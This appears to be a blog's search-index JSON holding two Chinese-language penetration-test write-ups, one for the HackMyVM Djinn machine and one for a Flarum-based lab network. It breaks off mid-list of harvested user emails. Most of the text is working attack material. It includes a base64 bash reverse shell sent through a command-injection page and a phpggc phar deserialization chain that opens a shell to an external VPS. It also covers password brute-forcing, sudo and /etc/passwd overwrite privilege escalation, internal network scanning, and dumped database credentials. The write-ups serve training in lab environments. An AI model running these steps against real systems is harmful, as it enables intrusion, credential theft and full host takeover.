{"meta":{"title":"lvzhouhang","subtitle":"","description":"","author":"lvzhouhang","url":"https://lvzhouhang.xyz","root":"/"},"pages":[{"title":"文章分类","date":"2023-01-01T07:04:00.000Z","updated":"2023-01-01T07:20:11.000Z","comments":true,"path":"categories/index.html","permalink":"https://lvzhouhang.xyz/categories/index.html","excerpt":"","text":""},{"title":"文章标签","date":"2023-01-01T07:07:09.000Z","updated":"2023-01-01T07:20:24.217Z","comments":true,"path":"tags/index.html","permalink":"https://lvzhouhang.xyz/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2025-04-19T10:46:40.000Z","updated":"2025-04-19T10:47:17.347Z","comments":true,"path":"about/index.html","permalink":"https://lvzhouhang.xyz/about/index.html","excerpt":"","text":"try my best to be better!!!"}],"posts":[{"title":"HackmyVM-Djinn","slug":"HackmyVM-Djinn","date":"2025-05-06T08:48:03.000Z","updated":"2025-05-06T09:39:23.592Z","comments":true,"path":"2025/05/06/HackmyVM-Djinn/","permalink":"https://lvzhouhang.xyz/2025/05/06/HackmyVM-Djinn/","excerpt":"","text":"信息搜集12345678910┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:e7:50:e0 PCS Systemtechnik GmbH192.168.31.176 08:00:27:36:b4:d6 PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 3.098 seconds (82.63 hosts/sec). 3 respondeds 192.168.31.176是靶机ip 123456789101112131415161718192021222324252627282930313233343536373839404142434445┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# rustscan -a 192.168.31.176 -r 1-65535.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| &#123;&#125; &#125;| &#123; &#125; |&#123; &#123;__ &#123;_ _&#125;&#123; &#123;__ / ___&#125; / &#123;&#125; \\ | `| || .-. \\| &#123;_&#125; |.-._&#125; &#125; | | .-._&#125; &#125;\\ &#125;/ /\\ \\| |\\ |`-&#x27; `-&#x27;`-----&#x27;`----&#x27; `-&#x27; `----&#x27; `---&#x27; `-&#x27; `-&#x27;`-&#x27; `-&#x27;The Modern Day Port Scanner.________________________________________: http://discord.skerritt.blog :: https://github.com/RustScan/RustScan : --------------------------------------Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#x27;-b 65435&#x27;.Open 192.168.31.176:21Open 192.168.31.176:1337Open 192.168.31.176:7331[~] Starting Script(s)[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 04:49 EDTInitiating ARP Ping Scan at 04:49Scanning 192.168.31.176 [1 port]Completed ARP Ping Scan at 04:49, 0.07s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 04:49Completed Parallel DNS resolution of 1 host. at 04:49, 0.04s elapsedDNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating SYN Stealth Scan at 04:49Scanning 192.168.31.176 [3 ports]Discovered open port 21/tcp on 192.168.31.176Discovered open port 1337/tcp on 192.168.31.176Discovered open port 7331/tcp on 192.168.31.176Completed SYN Stealth Scan at 04:49, 0.02s elapsed (3 total ports)Nmap scan report for 192.168.31.176Host is up, received arp-response (0.00032s latency).Scanned at 2025-05-06 04:49:46 EDT for 0sPORT STATE SERVICE REASON21/tcp open ftp syn-ack ttl 641337/tcp open waste syn-ack ttl 647331/tcp open swx syn-ack ttl 64MAC Address: 08:00:27:36:B4:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Read data files from: /usr/share/nmapNmap done: 1 IP address (1 host up) scanned in 0.26 seconds Raw packets sent: 4 (160B) | Rcvd: 4 (160B) 21端口21端口可以匿名登录，里面有三个文件 123456789101112131415┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# ftp anonymous@192.168.31.176Connected to 192.168.31.176.220 (vsFTPd 3.0.3)331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||15556|)150 Here comes the directory listing.-rw-r--r-- 1 0 0 11 Oct 20 2019 creds.txt-rw-r--r-- 1 0 0 128 Oct 21 2019 game.txt-rw-r--r-- 1 0 0 113 Oct 21 2019 message.txt 1234567891011┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# cat creds.txtnitu:81299┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# cat game.txtoh and I forgot to tell you I&#x27;ve setup a game for you on port 1337. See if you can reach to thefinal level and get the prize.┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# cat message.txt@nitish81299 I am going on holidays for few days, please take care of all the work.And don&#x27;t mess up anything. 给了一个用户名，一个账号密码，还有一个游戏部署在1337上 1337端口nc连接是个口算题卡，写个脚本 12345678910111213141516171819202122232425262728import reimport socketdef get_question(s): data = s.recv(1024).decode() print(data) question_re=re.search(r&#x27;(\\d.+)\\)&#x27;,data) if question_re: question=question_re.group(1) return question else: return Nonedef send_answer(s,answer): print(answer) s.sendall(answer.encode()+b&#x27;\\n&#x27;)def main(): s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&#x27;192.168.31.176&#x27;,1337)) for _ in range(1,1002): question=get_question(s) if not question: continue print(question) answer = str(eval(question.replace(&#x27;,&#x27;,&#x27;&#x27;).replace(&quot;&#x27;&quot;,&#x27;&#x27;))) send_answer(s,answer) s.close()if __name__ == &#x27;__main__&#x27;: main() 会给一个Here is your gift , I hope you know what to do with it: 1356, 6784, 3409knock一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# knock 192.168.31.176 1356 6784 3409┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# rustscan -a 192.168.31.176 -r 1-65535.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| &#123;&#125; &#125;| &#123; &#125; |&#123; &#123;__ &#123;_ _&#125;&#123; &#123;__ / ___&#125; / &#123;&#125; \\ | `| || .-. \\| &#123;_&#125; |.-._&#125; &#125; | | .-._&#125; &#125;\\ &#125;/ /\\ \\| |\\ |`-&#x27; `-&#x27;`-----&#x27;`----&#x27; `-&#x27; `----&#x27; `---&#x27; `-&#x27; `-&#x27;`-&#x27; `-&#x27;The Modern Day Port Scanner.________________________________________: http://discord.skerritt.blog :: https://github.com/RustScan/RustScan : --------------------------------------I scanned ports so fast, even my computer was surprised.[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#x27;-b 65435&#x27;.Open 192.168.31.176:21Open 192.168.31.176:22Open 192.168.31.176:1337Open 192.168.31.176:7331[~] Starting Script(s)[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 05:13 EDTInitiating ARP Ping Scan at 05:13Scanning 192.168.31.176 [1 port]Completed ARP Ping Scan at 05:13, 0.07s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 05:13Completed Parallel DNS resolution of 1 host. at 05:13, 0.00s elapsedDNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating SYN Stealth Scan at 05:13Scanning 192.168.31.176 [4 ports]Discovered open port 21/tcp on 192.168.31.176Discovered open port 22/tcp on 192.168.31.176Discovered open port 7331/tcp on 192.168.31.176Discovered open port 1337/tcp on 192.168.31.176Completed SYN Stealth Scan at 05:13, 0.02s elapsed (4 total ports)Nmap scan report for 192.168.31.176Host is up, received arp-response (0.00043s latency).Scanned at 2025-05-06 05:13:30 EDT for 0sPORT STATE SERVICE REASON21/tcp open ftp syn-ack ttl 6422/tcp open ssh syn-ack ttl 641337/tcp open waste syn-ack ttl 647331/tcp open swx syn-ack ttl 64MAC Address: 08:00:27:36:B4:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Read data files from: /usr/share/nmapNmap done: 1 IP address (1 host up) scanned in 0.20 seconds Raw packets sent: 5 (204B) | Rcvd: 5 (204B) 现在22端口开了，但是之前给的账号密码不对 7331端口看看7331端口是什么，扫一下目录，能扫到一个/wish,是一个执行命令的地方，输入命令执行之后会跳转http://192.168.31.176:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A命令确实是执行了，反弹个shell 1echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjEyOS80NDQ0IDA+JjE=|base64 -d |bash 提权SAM在/home/nitish/.dev下有一个凭证 12www-data@djinn:/home/nitish/.dev$ cat creds.txtnitish:p4ssw0rdStr3r0n9 1234567nitish@djinn:~$ sudo -lMatching Defaults entries for nitish on djinn: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser nitish may run the following commands on djinn: (sam) NOPASSWD: /usr/bin/genie 12nitish@djinn:~$ sudo -u sam /usr/bin/genie -c &#x27;/bin/sh&#x27;Pass your wish to GOD, he might be able to help you. 哈哈哈哈 -c不行，看看其他参数，man手册里还有一个-cmd的参数 123nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd idmy man!!$ 提权ROOT1234567sam@djinn:~$ sudo -lMatching Defaults entries for sam on djinn: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser sam may run the following commands on djinn: (root) NOPASSWD: /root/lago sam的家目录下有一个.pyc,进行反编译 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 2.7from getpass import getuserfrom os import systemfrom random import randintdef naughtyboi(): print &#x27;Working on it!! &#x27;def guessit(): num = randint(1, 101) print &#x27;Choose a number between 1 to 100: &#x27; s = input(&#x27;Enter your number: &#x27;) if s == num: system(&#x27;/bin/sh&#x27;) else: print &#x27;Better Luck next time&#x27;def readfiles(): user = getuser() path = input(&#x27;Enter the full of the file to read: &#x27;) print &#x27;User %s is not allowed to read %s&#x27; % (user, path)def options(): print &#x27;What do you want to do ?&#x27; print &#x27;1 - Be naughty&#x27; print &#x27;2 - Guess the number&#x27; print &#x27;3 - Read some damn files&#x27; print &#x27;4 - Work&#x27; choice = int(input(&#x27;Enter your choice: &#x27;)) return choicedef main(op): if op == 1: naughtyboi() elif op == 2: guessit() elif op == 3: readfiles() elif op == 4: print &#x27;work your ass off!!&#x27; else: print &#x27;Do something better with your life&#x27;if __name__ == &#x27;__main__&#x27;: main(options()) 可以直接传入一个num，他会将你传入的num解析成变量就可以通过了，或者就爆破我就不试了 1234567891011sam@djinn:/home/sam$ sudo /root/lagoWhat do you want to do ?1 - Be naughty2 - Guess the number3 - Read some damn files4 - WorkEnter your choice:2Choose a number between 1 to 100:Enter your number: num# iduid=0(root) gid=0(root) groups=0(root)","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"春秋云镜-Flarum","slug":"春秋云镜-Flarum","date":"2025-05-05T02:52:29.000Z","updated":"2025-05-05T05:06:52.396Z","comments":true,"path":"2025/05/05/春秋云镜-Flarum/","permalink":"https://lvzhouhang.xyz/2025/05/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Flarum/","excerpt":"","text":"FLAG01fscan 先扫描一下 12345678910111213141516171819202122232425┌──(root㉿kali)-[~/Desktop/tmp]└─# ../pentest/fscan/fscan2 -h 39.98.127.236┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ _ __ __ _ _ __ __ _ _ __| | __ ││ / /_\\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ / ││ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\_ _,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-05-04 22:56:34] [INFO] 暴力破解线程数: 1[2025-05-04 22:56:34] [INFO] 开始信息扫描[2025-05-04 22:56:34] [INFO] 最终有效主机数量: 1[2025-05-04 22:56:34] [INFO] 开始主机扫描[2025-05-04 22:56:34] [INFO] 有效端口数量: 233[2025-05-04 22:56:34] [SUCCESS] 端口开放 39.98.127.236:22[2025-05-04 22:56:34] [SUCCESS] 端口开放 39.98.127.236:80[2025-05-04 22:56:34] [SUCCESS] 服务识别 39.98.127.236:22 =&gt; [ssh] 版本: 8.9p1 Ubuntu 3ubuntu0.3 产品: OpenSSH 系统: Linux 信息: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3.][2025-05-04 22:56:41] [SUCCESS] 服务识别 39.98.127.236:80 =&gt; [http][2025-05-04 22:56:43] [INFO] 存活端口数量: 2[2025-05-04 22:56:43] [INFO] 开始漏洞扫描[2025-05-04 22:56:43] [INFO] 加载的插件: ssh, webpoc, webtitle[2025-05-04 22:56:43] [SUCCESS] 网站标题 http://39.98.127.236 状态码: 200 长度: 5882 标题: 霄壤社区[2025-05-04 22:56:56] [SUCCESS] 扫描已完成: 3/3 页面上给了一个邮箱 administrator@xiaorang.lab 很明显就是管理员的邮箱，然后爆破密码得到 1chris 后台管理显示框架是 Flarum 1.6.0 参考文章 首先下载一个 phpggc 然后生成一个反弹 shell 的语句 12┌──(root㉿kali)-[~/Desktop/tmp/tmp/phpggc]└─# ./phpggc -p tar -b Monolog/RCE6 system &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/VPS/PORT 0 &gt;&amp;1&#x27;&quot; 然后在后台外观-&gt; 自定义样式里面添加 1@import (inline) &#x27;data:text/css;base64,xxx&#x27;; 访问 URL/assets/forum.css, 可以看到我们的反弹 shell 的语句已经被写进去了 然后在自定义样式里面修改成 123.test &#123; content: data-uri(&quot;phar://./assets/forum.css&quot;);&#125; 然后保存，shell 就被弹出来了，然后开始提权 1234567www-data@web01:/$ getcap -r / 2 &gt;/dev/null/snap/core20/1974/usr/bin/ping cap_net_raw = ep/snap/core20/1405/usr/bin/ping cap_net_raw = ep/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service, cap_net_admin = ep/usr/bin/openssl = ep/usr/bin/mtr-packet cap_net_raw = ep/usr/bin/ping cap_net_raw = ep 可以看到 openssl 具有 sgid 的权限，写文件提权！ 123456789101112131415161718192021222324252627282930313233343536373839404142www-data@web01:/tmp$ cat passwd root: x: 0:0: root:/root:/bin/bashdaemon: x: 1:1: daemon:/usr/sbin:/usr/sbin/nologinbin: x: 2:2: bin:/bin:/usr/sbin/nologinsys: x: 3:3: sys:/dev:/usr/sbin/nologinsync: x: 4:65534: sync:/bin:/bin/syncgames: x: 5:60: games:/usr/games:/usr/sbin/nologinman: x: 6:12: man:/var/cache/man:/usr/sbin/nologinlp: x: 7:7: lp:/var/spool/lpd:/usr/sbin/nologinmail: x: 8:8: mail:/var/mail:/usr/sbin/nologinnews: x: 9:9: news:/var/spool/news:/usr/sbin/nologinuucp: x: 10:10: uucp:/var/spool/uucp:/usr/sbin/nologinproxy: x: 13:13: proxy:/bin:/usr/sbin/nologinwww-data: x: 33:33: www-data:/var/www:/usr/sbin/nologinbackup: x: 34:34: backup:/var/backups:/usr/sbin/nologinlist: x: 38:38: Mailing List Manager:/var/list:/usr/sbin/nologinirc: x: 39:39: ircd:/run/ircd:/usr/sbin/nologingnats: x: 41:41: Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody: x: 65534:65534: nobody:/nonexistent:/usr/sbin/nologin_apt: x: 100:65534::/nonexistent:/usr/sbin/nologinsystemd-network: x: 101:102: systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve: x: 102:103: systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus: x: 103:104::/nonexistent:/usr/sbin/nologinsystemd-timesync: x: 104:105: systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinpollinate: x: 105:1::/var/cache/pollinate:/bin/falsesshd: x: 106:65534::/run/sshd:/usr/sbin/nologinsyslog: x: 107:113::/home/syslog:/usr/sbin/nologinuuidd: x: 108:114::/run/uuidd:/usr/sbin/nologintcpdump: x: 109:115::/nonexistent:/usr/sbin/nologintss: x: 110:116: TPM software stack,,,:/var/lib/tpm:/bin/falselandscape: x: 111:117::/var/lib/landscape:/usr/sbin/nologinusbmux: x: 112:46: usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinlxd: x: 999:100::/var/snap/lxd/common/lxd:/bin/falsentp: x: 113:118::/nonexistent:/usr/sbin/nologin_chrony: x: 114:124: Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologinfwupd-refresh: x: 115:125: fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologinmysql: x: 116:127: MySQL Server,,,:/nonexistent:/bin/falsell: $1$ Zg12rJZk$P7IV1RqAT005RKjprDSo41:0:0: root:/root:/bin/bashwww-data@web01:/tmp$ cat passwd |openssl enc -out /etc/passwdwww-data@web01:/tmp$ su - llPassword: root@web01:~# flag 在/root 下 FLAG03上传 fscan 再做一个代理，fscan 扫！ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192root@web01:~# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 :: 1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e: 32:30: a9 brd ff: ff: ff: ff: ff: ff altname enp0s5 altname ens5 inet 172.22.60.52/16 metric 100 brd 172.22.255.255 scope global dynamic eth0 valid_lft 315359312sec preferred_lft 315359312sec inet6 fe80:: 216:3eff: fe32:30a9/64 scope link valid_lft forever preferred_lft foreverroot@web01:~# ./fscan2 -h 172.22.60.52/24┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ _ __ __ _ _ __ __ _ _ __| | __ ││ / /_\\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ / ││ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\_ _,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-05-05 11:28:42] [INFO] 暴力破解线程数: 1[2025-05-05 11:28:42] [INFO] 开始信息扫描[2025-05-05 11:28:42] [INFO] CIDR 范围: 172.22.60.0-172.22.60.255[2025-05-05 11:28:42] [INFO] 生成 IP 范围: 172.22.60.0.%! d(string = 172.22.60.255) - %! s(MISSING).%! d(MISSING)[2025-05-05 11:28:42] [INFO] 解析 CIDR 172.22.60.52/24 -&gt; IP 范围 172.22.60.0-172.22.60.255[2025-05-05 11:28:42] [INFO] 最终有效主机数量: 256[2025-05-05 11:28:42] [INFO] 开始主机扫描[2025-05-05 11:28:42] [SUCCESS] 目标 172.22.60.52 存活 (ICMP)[2025-05-05 11:28:42] [SUCCESS] 目标 172.22.60.8 存活 (ICMP)[2025-05-05 11:28:42] [SUCCESS] 目标 172.22.60.15 存活 (ICMP)[2025-05-05 11:28:42] [SUCCESS] 目标 172.22.60.42 存活 (ICMP)[2025-05-05 11:28:45] [INFO] 存活主机数量: 4[2025-05-05 11:28:45] [INFO] 有效端口数量: 233[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.8:88[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.8:389[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.42:139[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.15:139[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.8:139[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.42:135[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.15:135[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.8:135[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.42:445[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.15:445[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.8:445[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.52:22[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.52:80[2025-05-05 11:28:46] [SUCCESS] 服务识别 172.22.60.52:22 =&gt; [ssh] 版本: 8.9p1 Ubuntu 3ubuntu0.3 产品: OpenSSH 系统: Linux 信息: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3.][2025-05-05 11:28:50] [SUCCESS] 服务识别 172.22.60.8:88 =&gt;[2025-05-05 11:28:50] [SUCCESS] 服务识别 172.22.60.42:139 =&gt; Banner: [.][2025-05-05 11:28:50] [SUCCESS] 服务识别 172.22.60.8:389 =&gt;[2025-05-05 11:28:50] [SUCCESS] 服务识别 172.22.60.15:139 =&gt; Banner: [.][2025-05-05 11:28:50] [SUCCESS] 服务识别 172.22.60.8:139 =&gt; Banner: [.][2025-05-05 11:28:51] [SUCCESS] 服务识别 172.22.60.42:445 =&gt;[2025-05-05 11:28:51] [SUCCESS] 服务识别 172.22.60.15:445 =&gt;[2025-05-05 11:28:51] [SUCCESS] 服务识别 172.22.60.8:445 =&gt;[2025-05-05 11:28:51] [SUCCESS] 服务识别 172.22.60.52:80 =&gt; [http][2025-05-05 11:29:50] [SUCCESS] 服务识别 172.22.60.42:135 =&gt;[2025-05-05 11:29:50] [SUCCESS] 服务识别 172.22.60.15:135 =&gt;[2025-05-05 11:29:51] [SUCCESS] 服务识别 172.22.60.8:135 =&gt;[2025-05-05 11:29:51] [INFO] 存活端口数量: 13[2025-05-05 11:29:51] [INFO] 开始漏洞扫描[2025-05-05 11:29:51] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-05-05 11:29:51] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.60.8主机名: DC发现的网络接口: IPv4 地址: └─ 172.22.60.8 └─ 169.254.24.199[2025-05-05 11:29:51] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.60.15主机名: PC1发现的网络接口: IPv4 地址: └─ 172.22.60.15 └─ 169.254.125.121[2025-05-05 11:29:51] [SUCCESS] NetBios 172.22.60.42 XIAORANG\\FILESERVER[2025-05-05 11:29:51] [SUCCESS] NetBios 172.22.60.15 XIAORANG\\PC1[2025-05-05 11:29:51] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.60.42主机名: Fileserver发现的网络接口: IPv4 地址: └─ 172.22.60.42 └─ 169.254.128.155[2025-05-05 11:29:51] [SUCCESS] NetBios 172.22.60.8 DC: XIAORANG\\DC[2025-05-05 11:29:51] [SUCCESS] 网站标题 http://172.22.60.52 状态码: 200 长度: 5867 标题: 霄壤社区 123456789101112131415161718192021222324252627282930root@web01:/var/www/html# cat config.php&lt;?php return array ( &#x27;debug&#x27; =&gt; false, &#x27;database&#x27; =&gt; array ( &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;, &#x27;host&#x27; =&gt; &#x27;localhost&#x27;, &#x27;port&#x27; =&gt; 3306, &#x27;database&#x27; =&gt; &#x27;flarum&#x27;, &#x27;username&#x27; =&gt; &#x27;root&#x27;, &#x27;password&#x27; =&gt; &#x27;Mysql@root123&#x27;, &#x27;charset&#x27; =&gt; &#x27;utf8mb4&#x27;, &#x27;collation&#x27; =&gt; &#x27;utf8mb4_unicode_ci&#x27;, &#x27;prefix&#x27; =&gt; &#x27;flarum_&#x27;, &#x27;strict&#x27; =&gt; false, &#x27;engine&#x27; =&gt; &#x27;InnoDB&#x27;, &#x27;prefix_indexes&#x27; =&gt; true, ), &#x27;url&#x27; =&gt; &#x27;http://&#x27;.$_SERVER[&#x27;HTTP_HOST&#x27;], &#x27;paths&#x27; =&gt; array ( &#x27;api&#x27; =&gt; &#x27;api&#x27;, &#x27;admin&#x27; =&gt; &#x27;admin&#x27;, ), &#x27;headers&#x27; =&gt; array ( &#x27;poweredByHeader&#x27; =&gt; true, &#x27;referrerPolicy&#x27; =&gt; &#x27;same-origin&#x27;, ),); 拿到数据库的用户名和密码了，进行一波信息搜集 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251mysql &gt; select email from flarum_users;+----------------------------+| email |+----------------------------+| administrator@xiaorang.lab || chenbin@xiaorang.lab || chenbo@xiaorang.lab || chenchao@xiaorang.lab || chenchen@xiaorang.lab || chenfang@xiaorang.lab || chenhong@xiaorang.lab || chenhua@xiaorang.lab || chenjie@xiaorang.lab || chenjing@xiaorang.lab || chenjuan@xiaorang.lab || chenjun@xiaorang.lab || chenlei@xiaorang.lab || chenli@xiaorang.lab || chenlin@xiaorang.lab || chenling@xiaorang.lab || chenlong@xiaorang.lab || chenmin@xiaorang.lab || chenpeng@xiaorang.lab || chenping@xiaorang.lab || chenqiang@xiaorang.lab || chentao@xiaorang.lab || chenwei@xiaorang.lab || chenyan@xiaorang.lab || chenying@xiaorang.lab || chenyong@xiaorang.lab || chenyun@xiaorang.lab || gaofeng@xiaorang.lab || huangmin@xiaorang.lab || huangyong@xiaorang.lab || libin@xiaorang.lab || libing@xiaorang.lab || libo@xiaorang.lab || lichao@xiaorang.lab || lidan@xiaorang.lab || lifang@xiaorang.lab || lifeng@xiaorang.lab || ligang@xiaorang.lab || lihao@xiaorang.lab || lihong@xiaorang.lab || lihua@xiaorang.lab || lijia@xiaorang.lab || lijian@xiaorang.lab || lijie@xiaorang.lab || lijing@xiaorang.lab || lijuan@xiaorang.lab || lijun@xiaorang.lab || likai@xiaorang.lab || lilei@xiaorang.lab || lili@xiaorang.lab || liliang@xiaorang.lab || lilin@xiaorang.lab || liling@xiaorang.lab || lilong@xiaorang.lab || limin@xiaorang.lab || liming@xiaorang.lab || lina@xiaorang.lab || lining@xiaorang.lab || lipeng@xiaorang.lab || liping@xiaorang.lab || liqian@xiaorang.lab || liqiang@xiaorang.lab || liqin@xiaorang.lab || lishuai@xiaorang.lab || litao@xiaorang.lab || liubin@xiaorang.lab || liubing@xiaorang.lab || liuchang@xiaorang.lab || liuchao@xiaorang.lab || liudan@xiaorang.lab || liufang@xiaorang.lab || liufei@xiaorang.lab || liufeng@xiaorang.lab || liugang@xiaorang.lab || liuhao@xiaorang.lab || liuhua@xiaorang.lab || liuhuan@xiaorang.lab || liuhui@xiaorang.lab || liujia@xiaorang.lab || liujing@xiaorang.lab || liujun@xiaorang.lab || liukai@xiaorang.lab || liulei@xiaorang.lab || liuli@xiaorang.lab || liuling@xiaorang.lab || liumei@xiaorang.lab || liumin@xiaorang.lab || liuming@xiaorang.lab || liuna@xiaorang.lab || liupeng@xiaorang.lab || liuping@xiaorang.lab || liuqian@xiaorang.lab || liuqiang@xiaorang.lab || liuqin@xiaorang.lab || liushuai@xiaorang.lab || liutao@xiaorang.lab || liuwei@xiaorang.lab || liuxia@xiaorang.lab || liuxin@xiaorang.lab || liuyan@xiaorang.lab || liuying@xiaorang.lab || liuyong@xiaorang.lab || liuyun@xiaorang.lab || liwei@xiaorang.lab || liwen@xiaorang.lab || lixiang@xiaorang.lab || lixin@xiaorang.lab || lixue@xiaorang.lab || liyan@xiaorang.lab || liyang@xiaorang.lab || liying@xiaorang.lab || liyong@xiaorang.lab || liyun@xiaorang.lab || machao@xiaorang.lab || sunwei@xiaorang.lab || wangbin@xiaorang.lab || wangbing@xiaorang.lab || wangbo@xiaorang.lab || wangchao@xiaorang.lab || wangcheng@xiaorang.lab || wangdan@xiaorang.lab || wangdong@xiaorang.lab || wangfang@xiaorang.lab || wanggang@xiaorang.lab || wanghao@xiaorang.lab || wanghua@xiaorang.lab || wanghuan@xiaorang.lab || wanghui@xiaorang.lab || wangjian@xiaorang.lab || wangjing@xiaorang.lab || wangjuan@xiaorang.lab || wangkai@xiaorang.lab || wangkun@xiaorang.lab || wanglei@xiaorang.lab || wangli@xiaorang.lab || wangliang@xiaorang.lab || wanglin@xiaorang.lab || wangling@xiaorang.lab || wanglong@xiaorang.lab || wanglu@xiaorang.lab || wangmei@xiaorang.lab || wangmin@xiaorang.lab || wangming@xiaorang.lab || wangna@xiaorang.lab || wangning@xiaorang.lab || wangping@xiaorang.lab || wangqian@xiaorang.lab || wangqiang@xiaorang.lab || wangqin@xiaorang.lab || wangrong@xiaorang.lab || wangrui@xiaorang.lab || wangtao@xiaorang.lab || wangting@xiaorang.lab || wangwei@xiaorang.lab || wangxia@xiaorang.lab || wangxin@xiaorang.lab || wangxu@xiaorang.lab || wangxue@xiaorang.lab || wangyan@xiaorang.lab || 